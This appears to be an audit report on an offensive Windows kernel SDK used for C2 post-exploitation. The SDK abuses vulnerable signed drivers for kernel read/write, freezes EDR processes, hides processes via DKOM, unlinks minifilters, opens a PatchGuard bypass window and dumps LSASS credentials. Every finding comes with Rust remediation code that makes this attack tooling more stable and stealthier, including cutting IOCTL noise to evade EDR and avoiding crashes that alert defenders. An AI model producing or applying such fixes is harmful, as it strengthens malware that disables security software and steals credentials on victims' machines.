# Nyx Kernel-Tier SDK Code Audit Report

This report documents the security vulnerabilities, cryptographic/design flaws, detection/attribution vectors, and stability/BSOD triggers identified during the code audit of the `nyx-operator-kernelsdk` crate.

---

## Executive Summary

The `nyx-operator-kernelsdk` crate provides operator-side kernel-tier capabilities (C2 bootstrap and post-exploitation primitives). It is designed to run operator-side, communicating with vulnerable signed drivers (BYOVD) or native Microsoft drivers (KslD/Living off the Defender) to perform kernel read/write operations on the target system.

During the audit of the core SDK modules, several critical issues were identified:
1. **Critical Page-Boundary Translation Flaw** in the virtual R/W adapter (`VaKernelRw::kread`), which corrupts memory reads crossing page boundaries and can trigger system-wide BSOD.
2. **Handle/Resource Leaks** in EDR neutralization methods (`freeze_edr_coma` and `choke_edr_qos`), leaving target EDRs permanently disabled or corrupted and leaking system handles in the long-lived operator process.
3. **Invalid Handle Detection Bug** in `freeze_edr_coma` when calling `CreateFileW`.
4. **Extreme Telemetry/IOCTL Noise** during dynamic offset scanning due to unaligned QWORD reads on byte-boundaries.
5. **Missing Kernel Address Validation** on LIST_ENTRY unlinking for process hiding (DKOM) and minifilter detaching, exposing the kernel to pointer-corruption crash triggers.
6. **Omission of PEB Check** in dynamic offset probe leading to silent crashes during credential dumping.

---

## Detailed Findings

### Finding 1: `VaKernelRw` Out-of-Bounds Physical Memory Read (CRITICAL)

* **Severity**: Critical
* **Affected Code**: `crates/operator-kernelsdk/src/win/va_rw.rs` (`VaKernelRw::kread`)
* **Impact**: System Crash (BSOD), Page/Bus Faults, Physical Memory Disclosure.

#### Description
In `VaKernelRw::kread`, the virtual-to-physical address translation is performed only once at the starting virtual address (`kaddr`):
```rust
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        let pa = translate_va(&self.phys, self.cr3, kaddr as u64).map_err(map_phys_err)?;
        self.phys.read_phys(pa, dst).map_err(map_phys_err)
    }
```
If `dst` is large enough or `kaddr` is positioned such that the read range crosses a 4KB page boundary, the adapter reads physical memory sequentially starting from `pa`. However, consecutive virtual pages are rarely mapped to contiguous physical pages. 

As a result, reading across page boundaries retrieves data from completely unrelated physical pages (leaking memory of other processes) and, if it reads past the limit of physical RAM or hits device-mapped physical memory, it triggers a bus error/hardware fault in the CPU, instantly crashing the target system with a BSOD.

This stands in stark contrast to `VaKernelRw::kwrite`, which correctly segments writes into page-sized chunks and walks the page table for each chunk.

#### Threat Scenario
An operator uses a physical-memory vulnerable driver (like `dbutil` or `IQVW64E`) mapped via `VaKernelRw` to read an EPROCESS structure or process list. The target structure sits across a page boundary. The read returns garbage bytes, causing the loader to interpret corrupted pointers, leading to subsequent invalid kernel writes or a page fault, instantly crashing the machine and alerting the blue team.

#### Remediation
Re-implement `VaKernelRw::kread` to chunk reads by page boundary, translating the virtual address for each chunk exactly like `kwrite` does:

```rust
    fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
        let mut va = kaddr as u64;
        let mut remaining = dst;
        while !remaining.is_empty() {
            let page_off = (va & 0xFFF) as usize;
            let bytes_in_page = 0x1000 - page_off;
            let chunk_len = remaining.len().min(bytes_in_page);
            let (chunk, rest) = remaining.split_at_mut(chunk_len);

            let pa = translate_va(&self.phys, self.cr3, va).map_err(map_phys_err)?;
            self.phys.read_phys(pa, chunk).map_err(map_phys_err)?;

            va += chunk_len as u64;
            remaining = rest;
        }
        Ok(())
    }
```

---

### Finding 2: Resource Leaks & Permanent Telemetry Coma in `freeze_edr_coma` and `choke_edr_qos` (HIGH)

* **Severity**: High
* **Affected Code**: `crates/operator-kernelsdk/src/netsec.rs` (`freeze_edr_coma` and `choke_edr_qos`)
* **Impact**: Permanent EDR Disabling (Forensic Trace/IOC), Operator Process Resource Exhaustion.

#### Description
Both `freeze_edr_coma` and `choke_edr_qos` establish handles to system resources (`h_file` for dump-file locking and `qos_handle` for network throttling) to maintain their telemetry neutralization states. 

However, these handles are stored only in local variables inside the functions. When the functions return `Ok(())`, the handle variables go out of scope and their values are lost. Because the handles are never closed, the telemetry coma/throttle is maintained, but the operator has no way to cleanly close the handles to recover the EDR process later without restarting the entire operator C2 process.

Furthermore, in `freeze_edr_coma`, if `MiniDumpWriteDump` fails (returns `0`), the file handle `h_file` is leaked in the operator process instead of being closed.

#### Threat Scenario
An operator disables the target EDR using `freeze_edr_coma`. Later, the operator completes their task and wishes to leave the system cleanly. Because the handle is lost, they cannot close it. The EDR process remains permanently frozen in a "WER coma" long after the operator session is closed, generating an obvious forensic trail and raising suspicion. 

#### Remediation
Define a cleanup guard structure that wraps the handles and implements `Drop` to automatically close them, or return the handles to the caller. 

```rust
pub struct EdrNeutralizeGuard {
    #[cfg(target_os = "windows")]
    handle: *mut core::ffi::c_void,
    kind: NeutralizeMethod,
}

#[cfg(target_os = "windows")]
impl Drop for EdrNeutralizeGuard {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            unsafe {
                match self.kind {
                    NeutralizeMethod::Freeze => {
                        type CloseHandleFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
                        if let Ok(close) = crate::win::resolve::resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle") {
                            close(self.handle);
                        }
                    }
                    NeutralizeMethod::Choke => {
                        type QOSCloseHandleFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
                        if let Ok(close) = crate::win::resolve::resolve_sym::<QOSCloseHandleFn>(b"qwave.dll", b"QOSCloseHandle") {
                            close(self.handle);
                        }
                    }
                    _ => {}
                }
            }
            self.handle = core::ptr::null_mut();
        }
    }
}
```
Update `freeze_edr_coma` and `choke_edr_qos` to return `Result<EdrNeutralizeGuard, KitError>`, and ensure `h_file` is closed on failure path in `freeze_edr_coma`.

---

### Finding 3: `CreateFileW` Invalid Handle Detection Bug in `freeze_edr_coma` (MEDIUM)

* **Severity**: Medium
* **Affected Code**: `crates/operator-kernelsdk/src/netsec.rs` (`freeze_edr_coma`)
* **Impact**: Silent Failure to Disable EDR, Handle Leak.

#### Description
In `freeze_edr_coma`, the code checks if `CreateFileW` succeeded via `h_file.is_null()`:
```rust
    let h_file = unsafe {
        create_file_w(
            path_buf.as_ptr(),
            0x80000000 | 0x40000000,
            0,
            core::ptr::null_mut(),
            2,
            0x80,
            core::ptr::null_mut(),
        )
    };
    if h_file.is_null() {
        let _ = unsafe { close_handle(h_process) };
        return Err(KitError::Other(format!(
            "CreateFileW failed for dump file..."
        )));
    }
```
However, `CreateFileW` returns `INVALID_HANDLE_VALUE` (`-1` or `0xFFFFFFFFFFFFFFFF`), not `NULL` (`0`), upon failure. If file creation fails (e.g. `C:\Windows\Temp` is not writable or access is denied), the check is bypassed because `h_file` is not null. The code then attempts to call `MiniDumpWriteDump` with `INVALID_HANDLE_VALUE`, causing it to fail or behave unexpectedly.

#### Threat Scenario
The C2 agent runs in a restricted admin context where writing to `C:\Windows\Temp` is blocked. `CreateFileW` fails and returns `-1`. The check is bypassed, `MiniDumpWriteDump` is called with `-1`, and fails. The EDR is not disabled, but the operator receives a misleading warning that the WER coma may be "partial" rather than a clear error that the operation failed completely, leaving them vulnerable to active EDR detection.

#### Remediation
Correct the failure check to match `INVALID_HANDLE_VALUE`:
```rust
    if h_file.is_null() || h_file as isize == -1 {
        let _ = unsafe { close_handle(h_process) };
        return Err(KitError::Other(format!(
            "CreateFileW failed (Win32 err={})",
            // Retrieve GetLastError dynamically
        )));
    }
```

---

### Finding 4: Extreme IOCTL Noise and Potential Page Faults in Protection Byte Scan (LOW/OPSEC)

* **Severity**: Low (OPSEC / EDR Detection)
* **Affected Code**: `crates/operator-kernelsdk/src/offsets.rs` (`probe_eprocess_offsets` - Step 5)
* **Impact**: EDR/AV Detection, Memory Page Fault near boundaries.

#### Description
During the dynamic scanning of the System EPROCESS structure to locate the `Protection` byte, the code reads a QWORD (`kread_u64`) at each sequential byte offset:
```rust
    for off in image_name_offset + 16..0xA00 {
        let byte = krw.kread_u64(system_eprocess_kva + off)? as u8;
        if byte == 0x72 { ... }
    }
```
In `ByovdDriver` (RTCore64), `kread` loops byte-by-byte. A single `kread_u64` call translates to 8 individual 1-byte read IOCTL requests. Reading a range of ~1440 bytes results in $1440 \times 8 = 11,520$ IOCTL calls. 

This high volume is extremely noisy and easily detected by EDR sensors monitoring driver interaction patterns. In addition, reading an unaligned QWORD near the end of a page boundary can cross into an unmapped page, potentially triggering a kernel page fault.

#### Threat Scenario
When the operator launches the agent on target, the dynamic offset resolver performs the Protection scan. The resulting storm of 11,000+ IOCTL calls to the vulnerable driver's device is flagged by the EDR as a credential-dumping/driver-abuse signature, terminating the agent and alerting the SOC.

#### Remediation
Scan using 1-byte reads instead of QWORDs. This reduces the number of IOCTLs by 800% and prevents page boundary crossing:
```rust
    for off in image_name_offset + 16..0xA00 {
        let mut byte = [0u8; 1];
        krw.kread(system_eprocess_kva + off, &mut byte)?;
        if byte[0] == 0x72 {
            protection_offset = Some(off);
            break;
        }
    }
```

---

### Finding 5: Missing Canonical Address Validation in Telemetry and DKOM Unlinking (LOW)

* **Severity**: Low (Stability / BSOD Risk)
* **Affected Code**: 
  - `crates/operator-kernelsdk/src/telemetry.rs` (`MiniFilterUnlinker::unlink_filter`)
  - `crates/operator-kernelsdk/src/persistence.rs` (`ProcessHider::unlink`)
* **Impact**: Kernel Panic (BSOD) on corrupted lists.

#### Description
In `unlink_filter` and `unlink`, the code extracts `Flink` and `Blink` from the target LIST_ENTRY structures and immediately performs write operations to those addresses:
```rust
        let flink = krw.kread_u64(link_kva)? as usize;
        let blink = krw.kread_u64(link_kva + 8)? as usize;
        // ...
        krw.kwrite_u64(blink, flink as u64)?;
        krw.kwrite_u64(flink + 8, blink as u64)?;
```
If the list has been tampered with, or if the offsets are incorrect, `flink` and `blink` could contain invalid/non-canonical memory addresses. Writing to them directly triggers an unhandled page fault or security exception, resulting in an immediate BSOD.

#### Threat Scenario
A user-mode EDR hook or an OS update corrupts or alters the minifilter link layout. The `unlink_filter` function reads corrupted pointers and writes to them. The system immediately bugchecks, dropping the connection and indicating active tampering.

#### Remediation
Validate that pointers are in the canonical kernel space range (`>= 0xFFFF800000000000`) before writing to them:
```rust
    if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
        return Err(KitError::UnsupportedPosture("corrupted or non-canonical list pointers"));
    }
```

---

### Finding 6: PEB Offset Omission in EPROCESS Dynamic Probe (LOW)

* **Severity**: Low
* **Affected Code**: `crates/operator-kernelsdk/src/offsets.rs` (`probe_eprocess_offsets`)
* **Impact**: Silent Failure / Crashes in credential dumping kits.

#### Description
The dynamic probe `probe_eprocess_offsets` extracts structure offsets from the System process (PID 4). Because the System process has no user-mode address space, its `Peb` pointer is NULL, preventing the probe from resolving the `peb` offset. It returns `peb: 0`.

If a caller (such as `KernelLsassReader::lsass_image_base`) uses the returned offsets structure for a technique that requires the PEB, it will read from `eprocess_kva + 0` (the EPROCESS header) and walk page tables using the resulting garbage pointer, leading to failures or memory corruption.

#### Threat Scenario
On a new/unsupported Windows build, the loader falls back to the dynamic probe. The operator then runs `dump_lsass` to retrieve credentials. The LSASS reader reads the first 8 bytes of the EPROCESS structure as the PEB address and performs page walks, causing errors or reading arbitrary memory.

#### Remediation
Ensure that all kits relying on the `peb` offset check that it is non-zero before proceeding:
```rust
        let peb_off = self.offsets.peb;
        if peb_off == 0 {
            return None;
        }
```

---

### Finding 7: Soft Suspension Race Condition in PatchGuard Bypass (LOW)

* **Severity**: Low
* **Affected Code**: `crates/operator-kernelsdk/src/persistence.rs` (`RuntimePgBypassWindow::enter_unchecked`)
* **Impact**: Intermittent System Crash (BSOD).

#### Description
In `RuntimePgBypassWindow::enter_unchecked`, the code zeroes the `valid_flag` to suspend PatchGuard validation on Win11 24H2+. However, this flag write is a "soft" suspension: if a PatchGuard validation cycle is already in progress when the flag is zeroed, it will continue executing. If we modify active process links (DKOM) during this time, PatchGuard will detect the modification and bugcheck.

#### Threat Scenario
The operator enters the unchecked window and unlinks their process. Right as they do this, a racing PatchGuard validation thread that had already started its cycle detects the unlinked process in `ActiveProcessLinks` and triggers a system crash.

#### Remediation
Keep the time window during which DKOM is applied to a minimum, or perform additional safety checks (such as verifying that the validation thread is sleeping/idle) before modifying kernel lists.
